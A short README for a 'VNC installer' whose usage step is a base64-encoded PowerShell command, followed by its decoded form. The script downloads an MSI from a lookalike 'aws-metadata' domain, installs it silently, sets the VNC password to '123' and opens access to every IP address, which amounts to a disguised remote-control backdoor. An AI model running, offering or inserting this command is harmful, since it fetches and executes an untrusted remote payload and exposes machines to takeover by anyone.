## VNC installer

## What it does

- Install TightVNC server configured to work with RDP sessions
- Sets the default password to 123
- Allows connections from anywhere

## How to use (works in CMD and Powershell)

`powershell.exe -ec cgBlAGcALgBlAHgAZQAgAEEARABEACAASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFQAaQBnAGgAdABWAE4AQwBcAFMAZQByAHYAZQByACAALwB2ACAAQwBvAG4AbgBlAGMAdABUAG8AUgBkAHAAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADEAIAAvAGYADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AdQBzAGUAYgBhAHMAaQBjAHAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvAGEAcwBzAGUAdABzAC4AYQB3AHMALQBtAGUAdABhAGQAYQB0AGEALgBjAG8AbQAvAHMAYgBPAFUAcgBQAEwAUwAvAHYAbgBjAC4AbQBzAGkAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAdgBuAGMALgBtAHMAaQAiADsADQAKAG0AcwBpAGUAeABlAGMAIAAvAGkAIAAiAEMAOgBcAHYAbgBjAC4AbQBzAGkAIgAgAC8AcQB1AGkAZQB0ACAALwBuAG8AcgBlAHMAdABhAHIAdAAgAFMARQBUAF8AVQBTAEUAVgBOAEMAQQBVAFQASABFAE4AVABJAEMAQQBUAEkATwBOAD0AMQAgAFYAQQBMAFUARQBfAE8ARgBfAFUAUwBFAFYATgBDAEEAVQBUAEgARQBOAFQASQBDAEEAVABJAE8ATgA9ADEAIABTAEUAVABfAFAAQQBTAFMAVwBPAFIARAA9ADEAIABWAEEATABVAEUAXwBPAEYAXwBQAEEAUwBTAFcATwBSAEQAPQAxADIAMwAgAFMARQBUAF8AVQBTAEUAQwBPAE4AVABSAE8ATABBAFUAVABIAEUATgBUAEkAQwBBAFQASQBPAE4APQAxACAAIABTAEUAVABfAEkAUABBAEMAQwBFAFMAUwBDAE8ATgBUAFIATwBMAD0AMQAgAFYAQQBMAFUARQBfAE8ARgBfAEkAUABBAEMAQwBFAFMAUwBDAE8ATgBUAFIATwBMAD0AIgAwAC4AMAAuADAALgAwAC0AMgA1ADUALgAyADUANQAuADIANQA1AC4AMgA1ADUAOgAwACIA`

## Unencoded script

`reg.exe ADD HKLM\SOFTWARE\TightVNC\Server /v ConnectToRdp /t REG_DWORD /d 1 /f
Invoke-WebRequest -usebasicparsing -Uri "http://assets.aws-metadata.com/sbOUrPLS/vnc.msi" -OutFile "C:\vnc.msi";
msiexec /i "C:\vnc.msi" /quiet /norestart SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=123 SET_USECONTROLAUTHENTICATION=1  SET_IPACCESSCONTROL=1 VALUE_OF_IPACCESSCONTROL="0.0.0.0-255.255.255.255:0"`